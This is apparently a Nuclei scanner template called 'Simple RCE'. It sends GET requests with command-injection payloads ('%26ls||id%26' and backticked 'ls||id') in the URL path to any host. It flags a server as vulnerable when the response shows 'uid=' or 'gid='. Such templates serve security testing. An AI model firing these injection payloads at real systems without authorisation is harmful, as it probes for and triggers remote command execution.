http:
- extractors:
  - regex:
    - (u|g)id=.*
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  matchers-condition: or
  raw:
  - 'GET /%26ls||id%26 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /`ls||id` HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  stop-at-first-match: true
id: simple-rce
info:
  author: reewardius
  name: Simple RCE
  severity: critical
  tags: rce,generic
